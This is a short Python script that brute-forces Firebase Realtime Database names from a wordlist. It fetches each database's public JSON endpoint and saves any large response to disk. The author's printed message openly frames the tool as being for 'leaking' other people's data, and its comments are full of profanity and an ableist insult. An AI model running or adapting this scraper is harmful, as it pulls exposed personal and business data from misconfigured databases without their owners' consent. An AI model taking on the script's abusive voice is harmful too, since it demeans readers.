import requests

print('Please wait while the program is loading...')
print('')
print('')
print('')
print('')
print('Just fucking kidding haha.')
print('Its already running you st00pid.')
print('')
print('')
print('')
print('')
print('Well same time this shit script is getting databases to you i will let you read a message from me. You can call me Mr. CryT0r well first of all everyone who will skid this code and claim its theirs should get a life. No one really likes you guys.... And yes. I know im super fucking bad at python just because im too lazy to really learn it.  Thank me later for this little piece of shit that i have made.  Also if ur autistic enough to now know how to use DONT FUCKING ASK HELP FROM ME! well this is the end of this shit text! Have fun time checking those databases when the script is done checking! also remember to follow my tw33ter! https://twitter.com/T0rCry also right now im wondering... How fucking cool and not so boring this text would look like if it had an color? Well anyways have fun time leaking shit! I wish you good luck on life and shit you know? Im trying to make you like me <3 well ok ok this was enough right? Well see you next time!')
print('Right now this script is loading! Dont fucking touch it or it will crash. Ofc you can always exit from it by doing CTRL + C on linux or just by closing the application')


# Btw i fucking hate python but i wanted to try what i could create with it :) so be fucking thankful for that! 

# ---------------------------------------------------------------
# - Finally this is where the script starts at.  				-
# - Trust me... It tooks ages to write all that bull shit!      -
# ---------------------------------------------------------------


# minimum amount of characters a database should have
RESPONSE_THRESHOLD = 1000 # You can basicly add any number here but if it's too small u migh't find a lot of useless databases!

# subdomain wordlist here! SUBDOMAIN! NOT DOMAIN! FUCKING DUMB ASS!
wordlist = "wordlist.txt"  # This fucking little line of code will define where to find the words that it looks for at firebaseio.com
# And yes. You do can change the worldlist name to what ever you want it to be but wouldn't it be a lot fucking easier to keep it as wordlist.txt? Also u can find the worldlist at the folder worldlist :)


# read word list from file
for line in open("wordlists/%s" % wordlist, "r").readlines():

	#prepares URL
	word = line.rstrip()
	url = "https://%s.firebaseio.com/.json" % word # Basicly it always get's a word from wordlist.txt and puts it to %s and if the firebaseio.com/.json has enough of characters it will add it to folder "databases"



	# request the database
	try:
		response = requests.get(url).text

	# in case the request fails, ignore
	except Exception as e:
		pass

	# I hope you already know what that thing does... I'm not going to explain it to you! 


	# only store if meets the size threshold
	if len(response) >= RESPONSE_THRESHOLD:

		with open("database/" + word, "w+") as file:
			file.write(response)
			
			print(url)

